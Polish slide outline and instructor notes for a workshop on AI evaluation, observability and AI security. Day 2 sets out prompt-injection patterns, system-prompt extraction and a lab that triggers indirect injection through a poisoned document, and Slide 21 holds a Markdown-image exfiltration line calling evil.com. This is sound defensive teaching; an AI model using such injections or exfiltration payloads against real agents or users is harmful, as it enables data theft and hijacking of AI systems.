# Konspekt slajdów i notatki dla prowadzącego: Produkcyjna inżynieria AI

**Format:** 2 sesje półdniowe po 3,5 godziny  
**Stos:** Python 3.11+, Langfuse (OpenTelemetry), Promptfoo + `pytest`, Microsoft Presidio, Garak  
**Odbiorcy:** Inżynierowie oprogramowania i AI budujący produkcyjne aplikacje oparte na LLM

---

## Dzień 1: Ewaluacje AI, obserwowalność i monitoring (3,5 godziny)

### Otwarcie i wprowadzenie (5 min)
- **Slajd 1: Tytuł i rezultaty warsztatów**
  - *Wizualizacja:* Diagram dwudniowej ścieżki (`Dzień 1: Mierz i obserwuj` → `Dzień 2: Broń i zarządzaj`).
  - *Punkty:* Koniec ze sprawdzaniem promptów „na oko”; budujemy skalibrowane ewaluacje, pełny tracing i bramki regresji w CI.
  - *Notatka dla prowadzącego:* Zapytaj salę: *„Ilu z was zmieniło jedno zdanie w prompcie systemowym, rzuciło okiem na 3 odpowiedzi, wdrożyło to, a potem okazało się, że zepsuło to zupełnie inny proces?”* Wykorzystaj podniesione ręce, by pokazać, po co są te warsztaty.

---

### Część 1.1: Dlaczego tradycyjne testowanie zawodzi i podstawy ewaluacji (40 min wykładu + 35 min Lab 1)

- **Slajd 2: Dlaczego `assert output == expected` nie działa w AI**
  - *Punkty:*
    - Stochastyczne odpowiedzi: to samo wejście, różne poprawne sformułowania.
    - Nieograniczona przestrzeń wejść: użytkownicy wymyślają sformułowania, języki i przypadki brzegowe, których nie da się wyliczyć.
    - Ciche regresje: snapshoty modeli u dostawcy (`gpt-4o-2024-xx` / `gemini-*`), zmiany w chunkowaniu czy edycje promptów obniżają jakość bez rzucania wyjątków.
  - *Notatka dla prowadzącego:* Podkreśl, że **testy jednostkowe nadal mają znaczenie** — tylko nie do sprawdzania równoważności semantycznej. Zachowaj deterministyczne asercje dla schematów, sygnatur narzędzi i budżetów opóźnień/tokenów.

- **Slajd 3: Piramida ewaluacji AI**
  - *Wizualizacja:* 4-poziomowa piramida od dołu (szybko/tanio) do góry (wolno/drogo):
    1. **Deterministyczne testy w kodzie** (`pydantic`, schemat JSON, regex, typy argumentów narzędzi, limity kosztów/opóźnień)
    2. **Metryki wyszukiwania i referencyjne** (Recall@k, MRR, NDCG dla RAG)
    3. **LLM-as-a-Judge** (wierność semantyczna, ton, zgodność z politykami)
    4. **Ocena przez człowieka** (budowanie Golden Datasets i kalibracja sędziów)
  - *Notatka dla prowadzącego:* Częste nieporozumienie: „Potrzebujemy LLM-as-a-Judge do wszystkiego”. Zaprotestuj: jeśli regex lub walidator Pydantic wyłapie problem w 1 ms za 0 zł, nigdy nie płać LLM-owi za ocenę.

- **Slajd 4: Najpierw analiza błędów (open i axial coding)**
  - *Punkty:*
    - Nie wymyślaj metryk w próżni — najpierw przeczytaj 50–100 surowych trace'ów.
    - **Open coding:** Zapisuj swobodne notatki przy każdym złym trace'ie (np. *„wymyślony termin zwrotu”*, *„zignorowane negatywne ograniczenie”*).
    - **Axial coding:** Pogrupuj notatki w 4–8 konkretnych trybów awarii; uszereguj według `częstotliwość × dotkliwość`.
    - Przypisz każdemu najważniejszemu trybowi awarii jeden skoncentrowany ewaluator Pass/Fail.
  - *Notatka dla prowadzącego:* Inżynierowie często chcą od razu sięgnąć po gotowe oceny „pomocności” w skali 1–5. Wyjaśnij, dlaczego ogólne oceny ukrywają konkretne błędy — binarne testy specyficzne dla domeny mówią, *co* trzeba naprawić.

- **Slajd 5: Budowanie Golden Dataset**
  - *Punkty:*
    - Zacznij od 30–100 wartościowych wierszy, a nie 10 000 syntetycznych.
    - Źródła: produkcyjne logi z ocenami „kciuk w dół”, eskalacje do supportu, taksonomia przypadków brzegowych, złośliwe przykłady startowe.
    - Stratyfikuj według intencji, trudności i poziomu ryzyka (FAQ o niskiej stawce vs. wywołania narzędzi modyfikujące stan).
    - Wersjonuj datasety w Git lub Langfuse razem z promptami.
  - *Notatka dla prowadzącego:* Przypomnij uczestnikom, że Golden Dataset to żywy zestaw testów — każdy błąd produkcyjny powinien stać się nowym wierszem.

- **Slajd 6: LLM-as-a-Judge: projektowanie i kalibracja**
  - *Punkty:*
    - Preferuj **binarne Pass/Fail** zamiast skal Likerta 1–5.
    - Wymuszaj **rozumowanie/krytykę przed werdyktem** w ustrukturyzowanym wyjściu JSON.
    - Znane biasy: *position bias* (kolejność A/B), *verbosity bias* (dłuższe = lepsze), *self-preference*.
    - **Zasada kalibracji:** Zmierz precision/recall sędziego na zbiorze walidacyjnym oetykietowanym przez ludzi, zanim zaufasz mu w CI.
  - *Notatka dla prowadzącego:* Podkreśl praktyczny trik: podczas kalibracji użyj jako sędziego silniejszego modelu lub modelu z innej rodziny niż generator, a dopiero potem przejdź na szybszego sędziego — tylko jeśli zgodność się utrzymuje.

- **Slajd 7: Odprawa przed Labem 1 — analiza błędów i skalibrowany sędzia (35 min)**
  - *Punkty:* Przejrzyj 20 trace'ów RAG → zidentyfikuj 3 główne tryby awarii → napisz deterministyczny test + binarnego sędziego Faithfulness → zmierz zgodność na 20 wydzielonych, oetykietowanych trace'ach.
  - *Notatka dla prowadzącego:* Około 15. minuty przejdź po sali i sprawdź, czy zespoły nie piszą mglistych promptów sędziego w stylu *„Oceń w skali 1–5, czy to jest dobre”*. Na koniec przeznacz 5 minut na omówienie, jak dodanie pola `reasoning` przed `verdict` poprawiło precision.

---

### Przerwa (15 min)

---

### Część 1.2: Obserwowalność, monitoring i przegląd platform (35 min wykładu + 25 min Lab 2)

- **Slajd 8: Anatomia trace'a LLM**
  - *Wizualizacja:* Kaskada spanów: `request` → `query_rewrite` → `vector_search` → `rerank` → `llm_generate` → `tool_call` → `final_response`.
  - *Punkty:*
    - Wymagane atrybuty: `model`, `prompt_version`, `tokens_in/out/cached`, `TTFT`, `total_latency`, `cost_usd`, `retrieved_doc_ids`, `session_id`.
    - Dlaczego **OpenTelemetry (GenAI Semantic Conventions)** ma znaczenie: instrumentujesz raz, backend zmieniasz później.
  - *Notatka dla prowadzącego:* Podkreśl konieczność `prompt_version` i `commit_sha` w każdym trace'ie. Bez tagów wersji nie da się zbisekcjonować skoku błędów po wdrożeniu.

- **Slajd 9: Monitoring online vs. ewaluacje offline**
  - *Punkty:*
    - **Kondycja systemu:** TTFT, opóźnienia P95/P99, zużycie tokenów na tenanta/funkcję, limity 429, uruchomienia fallbacków.
    - **Sygnały behawioralne:** Ponowne promptowanie, kopiowanie/porzucenie, feedback bezpośredni, odsetek pustych wyników wyszukiwania, błędy parsowania JSON.
    - **Wykrywanie dryfu:** Zmiany długości wejść, dryf tematów/embeddingów, nagłe skoki odmów po aktualizacjach u dostawcy.
  - *Notatka dla prowadzącego:* Zapytaj: *„Ile macie alertów na HTTP 500, a ile na sytuację, w której LLM zwrócił poprawny JSON z kodem 200 OK o treści »nie mogę w tym pomóc«?”*

- **Slajd 10: Przegląd platform i macierz wyboru**
  - *Tabela/punkty:*
    - **Open source / do samodzielnego hostowania:** *Langfuse* (tracing + zarządzanie promptami + datasety + ewaluacje), *Arize Phoenix* (natywnie OTel, inspekcja embeddingów/RAG), *Opik* (eksperymenty + tracing).
    - **Zarządzane / nastawione na ewaluację:** *Braintrust* (ścisła pętla od playgroundu do CI), *LangSmith* (natywny dla LangChain/LangGraph), *Helicone* (lekkie proxy/bramka).
    - **Narzędzia CLI typu code-first:** *Promptfoo*, *DeepEval*, *Ragas* (szybkie uruchamianie lokalnie i w CI).
  - *Notatka dla prowadzącego:* Uzasadnij wybór na warsztatach (**Langfuse + Promptfoo/pytest**): zespoły zyskują pełną kontrolę nad lokalizacją danych dzięki Langfuse oraz natywną dla Gita ergonomię CI dzięki Promptfoo/pytest.

- **Slajd 11: Odprawa przed Labem 2 — tracing i diagnoza wąskich gardeł (25 min)**
  - *Punkty:* Zinstrumentuj 3-etapowy skrypt Pythona (RAG + narzędzie) spanami Langfuse/OTel → dołącz `prompt_version` i ocenę użytkownika → zdiagnozuj, dlaczego wzrosły opóźnienie P95 i koszt tokenów.
  - *Notatka dla prowadzącego:* Podczas 5-minutowego omówienia wskaż podrzucone wąskie gardło (sekwencyjne wywołania narzędzi + rozdęty kontekst wyszukiwania `k=20`).

---

### Część 1.3: Produkcyjne pętle ewaluacji i integracja z CI/CD (30 min wykładu + 30 min Lab 3)

- **Slajd 12: Ciągły flywheel ewaluacji**
  - *Wizualizacja:* Diagram pętli: `Ruch produkcyjny` → `Scorery online i feedback użytkowników` → `Triaż` → `Golden Dataset` → `Bramka CI/CD` → `Wdrożenie kanarkowe`.
  - *Punkty:* Błędy produkcyjne stają się stałymi testami regresyjnymi; CI zapobiega wypuszczeniu tego samego błędu dwa razy.
  - *Notatka dla prowadzącego:* Podkreśl odpowiedzialność: inżynierowie są właścicielami Golden Dataset tak samo jak testów jednostkowych — to nie jest „robota dla QA”.

- **Slajd 13: Bramki CI/CD bez rozsadzania budżetu**
  - *Punkty:*
    - **Bramka PR (<2 min):** Deterministyczne testy `pytest` + 25–50 wartościowych przypadków smoke w `promptfoo` z szybkim sędzią.
    - **Nocne / przed wydaniem:** Pełny Golden Dataset (500+ wierszy), symulacje wieloturowe i benchmarki przy zmianie modelu.
    - **Kontrola wariancji:** Stosuj porównania parami (`baseline` vs. `candidate` na identycznych wejściach) i wymagaj `pass@k` lub progów ufności, zamiast reagować na pojedynczy niestabilny wiersz.
  - *Notatka dla prowadzącego:* Odnieś się do zarzutu nr 1: *„Uruchamianie ewaluacji LLM w CI jest zbyt wolne i drogie”*. Pokaż, jak podział na PR i testy nocne utrzymuje feedback z PR poniżej 2 minut i kosztuje grosze za uruchomienie.

- **Slajd 14: Bezpieczne wdrożenia — shadow, canary i rollback**
  - *Punkty:*
    - **Tryb shadow:** Asynchroniczne odtwarzanie ruchu na żywo na nowym prompcie/modelu; ocena offline.
    - **Canary (5% ruchu):** Automatyczny rollback przy błędach parsowania JSON, zadziałaniu guardrails lub regresji opóźnienia P95.
    - **Oddzielenie promptów od kodu:** Przechowuj wersjonowane prompty w Langfuse lub konfiguracji, aby awaryjny rollback nie wymagał przebudowy całego kontenera.
  - *Notatka dla prowadzącego:* Zakończ Dzień 1, łącząc obserwowalność z bezpieczeństwem: jutro zobaczymy, co się dzieje, gdy wejścia nie są po prostu zaszumione — są złośliwe.

- **Slajd 15: Odprawa przed Labem 3 — bramka regresji w CI (30 min)**
  - *Punkty:* Porównaj prompt `baseline` z `candidate` za pomocą `promptfoo` + `pytest` → wymuś `schema_validity == 100%` i `faithfulness >= 0.90` → wychwyć podrzuconą cichą regresję.
  - *Notatka dla prowadzącego:* Wyświetl na projektorze końcowy raport różnic (HTML/CLI), aby wszyscy zobaczyli, jak recenzent PR czyta nieudaną ewaluację.

---

## Dzień 2: Bezpieczeństwo AI (3,5 godziny)

### Otwarcie i podsumowanie Dnia 1 (5 min)
- **Slajd 16: Wprowadzenie do Dnia 2 — od niezawodności do odporności na ataki**
  - *Punkty:* Dzień 1 wyłapywał przypadkowe regresje; Dzień 2 to obrona przed celowymi atakami, wyciekami danych i niebezpiecznymi działaniami agentów.
  - *Notatka dla prowadzącego:* Połącz oba dni: każda luka bezpieczeństwa odkryta dzisiaj staje się nowym przypadkiem testowym w Golden Dataset z Dnia 1.

---

### Część 2.1: Zrozumienie powierzchni ataku AI (25 min wykładu + 20 min Lab 4)

- **Slajd 17: Przyczyna źródłowa — zlewanie się danych i instrukcji**
  - *Punkty:*
    - LLM przetwarzają prompty systemowe, wejście użytkownika, chunki RAG i wyniki narzędzi w **jednym wspólnym strumieniu tokenów**.
    - Brak sprzętowo wymuszonych pierścieni uprawnień (w przeciwieństwie do sparametryzowanych zapytań SQL czy podziału jądro/przestrzeń użytkownika w OS).
    - Każdy niezaufany tekst trafiający do okna kontekstu to potencjalne przejęcie warstwy sterowania.
  - *Notatka dla prowadzącego:* Użyj analogii do SQL injection: przed sparametryzowanymi zapytaniami sklejanie stringów mieszało kod z danymi. W LLM *wszystko* w oknie kontekstu nadal jest sklejonym tekstem — dlatego obrona musi działać na granicach architektury i narzędzi.

- **Slajd 18: 5 granic zaufania (zmapowanych na OWASP LLM Top 10)**
  - *Punkty:*
    1. **Granica wejścia:** Bezpośredni prompt injection, jailbreaki, przemycanie przez kodowanie.
    2. **Granica wyszukiwania / RAG:** Pośredni injection, zatruwanie korpusu, wycieki ACL między tenantami.
    3. **Granica narzędzi / agentowa:** Nadmierna autonomia, SSRF/SQLi przez argumenty generowane przez LLM, działania typu confused deputy.
    4. **Granica wyjścia:** Wstrzykiwanie Markdown/XSS, niebezpieczna obsługa wyjścia, slopsquatting.
    5. **Dane i łańcuch dostaw:** Wycieki przez logi, złośliwe serwery MCP/pluginy, luki w ZDR.
  - *Notatka dla prowadzącego:* Trzymaj OWASP w wymiarze praktycznym — powiąż każdą granicę z konkretnym błędem, który inżynierowie znają z bezpieczeństwa webu/backendu.

- **Slajd 19: „Zabójcza triada” (Lethal Trifecta) dla agentów AI**
  - *Wizualizacja:* Diagram Venna / trójkąt: `(1) Dostęp do prywatnych danych` + `(2) Ekspozycja na niezaufane treści` + `(3) Komunikacja zewnętrzna / modyfikacja stanu`.
  - *Punkty:*
    - Wszystkie trzy razem = ryzyko cichej eksfiltracji danych.
    - Przerwanie *dowolnej* nogi (np. usunięcie dowolnych wychodzących URL-i lub wymaganie potwierdzenia HITL dla zapisów zewnętrznych) drastycznie zmniejsza zasięg szkód.
  - *Notatka dla prowadzącego:* To najłatwiejszy do zapamiętania model mentalny Dnia 2. Wracaj do niego za każdym razem, gdy ktoś proponuje dać autonomicznemu agentowi narzędzia do zapisu w e-mailu/Slacku/HTTP.

- **Slajd 20: Odprawa przed Labem 4 — modelowanie zagrożeń aplikacji agentowej (20 min)**
  - *Punkty:* Na podstawie diagramu architektury (bot na Slacku + RAG na Confluence + narzędzia zapisu do Jiry/e-maila) zmapuj granice zaufania i udokumentuj 3 konkretne ścieżki ataku uszeregowane według `wpływ × prawdopodobieństwo`.
  - *Notatka dla prowadzącego:* Połącz inżynierów w pary na 12 minut, a następnie przez 8 minut zbierz najważniejsze ścieżki ataku na tablicy.

---

### Część 2.2: Ataki, halucynacje oraz prywatność danych / ochrona PII (35 min wykładu + 40 min Lab 5)

- **Slajd 21: Wzorce prompt injection i eksfiltracji przez wyjście**
  - *Punkty:*
    - **Bezpośrednie:** Odgrywanie persony, wychodzenie poza delimitery, Base64/homoglify, wieloturowe crescendo.
    - **Pośrednie:** Ukryty tekst w HTML/PDF-ach, zatrute zgłoszenia w supporcie, złośliwe odpowiedzi narzędzi.
    - **Wydobywanie promptu systemowego:** Nigdy nie przechowuj kluczy API, connection stringów do baz ani tajnych reguł biznesowych w promptach systemowych.
    - **Bezkliknięciowa eksfiltracja:** LLM renderuje `![x](https://evil.com/leak?data=SECRET)` w interfejsie obsługującym Markdown.
  - *Notatka dla prowadzącego:* Zrób demo na żywo lub pokaż konkretny przykład eksfiltracji przez obrazek w Markdown — inżynierowie niezmiennie są zaskoczeni, że chatbot tylko do odczytu może wyprowadzić dane przez wyrenderowany tag obrazka.

- **Slajd 22: Halucynacje jako ryzyko bezpieczeństwa i biznesowe**
  - *Punkty:*
    - **Slopsquatting:** Atakujący rejestrują często halucynowane nazwy pakietów w PyPI/npm.
    - **Nieautoryzowane zobowiązania:** Boty wymyślające rabaty, SLA lub warunki prawne.
    - **Mitygacje:** Ścisłe ugruntowanie w źródłach, weryfikacja cytowań, wyjścia ograniczone przez `enum`/schemat oraz deterministyczne sprawdzanie reguł biznesowych *poza* LLM.
  - *Notatka dla prowadzącego:* Utrwal zasadę: LLM nigdy nie może być ostatecznym autorytetem w sprawie cen, uprawnień czy kwalifikowalności.

- **Slajd 23: Prywatność danych, PII i kontrola dostępu w RAG**
  - *Punkty:*
    - **Redakcja przed wywołaniem LLM (Microsoft Presidio):** Wykrywaj i maskuj PII/sekrety (`<PERSON_1>`, `<EMAIL_1>`) *przed* wywołaniem zewnętrznych API modeli; w razie potrzeby przywracaj dane lokalnie.
    - **Higiena obserwowalności:** Usuwaj PII/tokeny przed wysłaniem spanów do Langfuse/OTel; ustaw okresy retencji (TTL).
    - **ACL w bazach wektorowych:** Egzekwuj uprawnienia tenanta/użytkownika jako obowiązkowe filtry metadanych *wewnątrz* zapytania wyszukującego — nigdy w prompcie systemowym.
    - **Kontrole po stronie dostawcy:** Zero Data Retention (ZDR), umowy wykluczające trenowanie na danych, endpointy regionalne.
  - *Notatka dla prowadzącego:* Podkreśl zasadę ACL w RAG: *„Jeśli dokument jest już w prompcie, na kontrolę dostępu jest za późno”.*

- **Slajd 24: Odprawa przed Labem 5 — atak i utwardzanie (40 min)**
  - *Punkty:*
    - *Część A (atak, 15 min):* Wywołaj pośredni injection przez zatruty dokument + eksfiltrację przez obrazek w Markdown.
    - *Część B (obrona, 25 min):* Dodaj redakcję PII przez Presidio, wymuś ACL tenantów w bazie wektorowej, sanityzuj linki Markdown i przenieś sprawdzenia autoryzacji do deterministycznych wrapperów narzędzi.
  - *Notatka dla prowadzącego:* Pilnuj, by Część A nie przekroczyła 15 minut, żeby wszyscy mieli dość czasu na wdrożenie zabezpieczeń w Części B.

---

### Przerwa (15 min)

---

### Część 2.3: Guardrails, kontrole w czasie działania, red teaming i governance (30 min wykładu + 30 min Lab 6 + 15 min podsumowania)

- **Slajd 25: Wielowarstwowe guardrails w czasie działania (defense-in-depth)**
  - *Wizualizacja:* 4-etapowy pipeline: `Kontrole wejścia` → `ACL wyszukiwania` → `Polityki narzędzi i HITL` → `Kontrole wyjścia`.
  - *Punkty:*
    - **Wejście:** Limity częstości/długości, szybkie klasyfikatory injection (np. Llama Guard / Lakera Guard / heurystyki), allowlisty tematów.
    - **Wykonywanie narzędzi:** Tokeny o minimalnym zakresie uprawnień, ścisła walidacja argumentów przez Pydantic, **człowiek w pętli (HITL)** dla zapisów destrukcyjnych/zewnętrznych.
    - **Wyjście:** Skanowanie pod kątem wycieku PII, kontrola toksyczności/polityk, kontrola ugruntowania.
    - **Budżet opóźnień:** Szybkie kontrole deterministyczne/małymi modelami uruchamiaj synchronicznie; ciężkie — asynchronicznie lub tylko dla akcji wysokiego ryzyka.
  - *Notatka dla prowadzącego:* Ostrzeż przed układaniem 5 synchronicznych wywołań LLM jako guardrails jedno po drugim — użytkownicy porzucą chatbota, który odpowiada 12 sekund.

- **Slajd 26: Automatyczny red teaming (`garak` i `promptfoo redteam`)**
  - *Punkty:*
    - Traktuj red teaming AI jak zautomatyzowany fuzzing + pentesty.
    - Kategorie ataków: jailbreaki, wydobywanie PII, pośredni injection, nadmierna autonomia, manipulacja poza tematem/wizerunkiem marki.
    - Śledź **wskaźnik skuteczności ataków (Attack Success Rate, ASR)** w czasie.
    - **Zamknij pętlę:** Każdy udany exploit → dodany do Golden Dataset z Dnia 1 jako stały test w CI.
  - *Notatka dla prowadzącego:* Pokaż, że `garak` sonduje szeroko słabości modelu/systemu, a `promptfoo redteam` sprawdza się najlepiej w zestawach adwersaryjnych specyficznych dla aplikacji i zintegrowanych z CI.

- **Slajd 27: Governance i gotowość produkcyjna**
  - *Punkty:*
    - **Inwentaryzacja i przepływ danych:** Udokumentuj modele, status ZDR, klasyfikację danych oraz zewnętrzne serwery MCP/narzędzia.
    - **Reagowanie na incydenty:** Kill switche dla narzędzi oparte na feature flagach, natychmiastowy rollback promptu, fallback na innego dostawcę i bezpieczne odpowiedzi w trybie degradacji.
    - **Zgodność i audyt:** Niezmienialne logi wywołań narzędzi przez agentów; zgodność z NIST AI RMF / poziomami ryzyka EU AI Act.
  - *Notatka dla prowadzącego:* Zapytaj zespoły: *„Jeśli o 2 w nocy wasz agent zacznie wysyłać złe e-maile, ile sekund zajmie wam wyłączenie tego narzędzia bez ponownego wdrożenia?”*

- **Slajd 28: Odprawa przed Labem 6 — guardrails i red teaming (30 min)**
  - *Punkty:* Podłącz kontrolę injection na wejściu + bramkę HITL/polityki dla narzędzia modyfikującego stan → uruchom skan `promptfoo redteam` / `garak` → przeanalizuj ASR → przenieś 2 wykryte exploity do testów regresyjnych `pytest`/CI.
  - *Notatka dla prowadzącego:* W końcowym 15-minutowym podsumowaniu omów **Checklistę gotowości produkcyjnej** z [curriculum-pl.md](./curriculum-pl.md) i poproś każdego uczestnika o wskazanie jednej luki w jego obecnym systemie produkcyjnym, którą naprawi jako pierwszą.
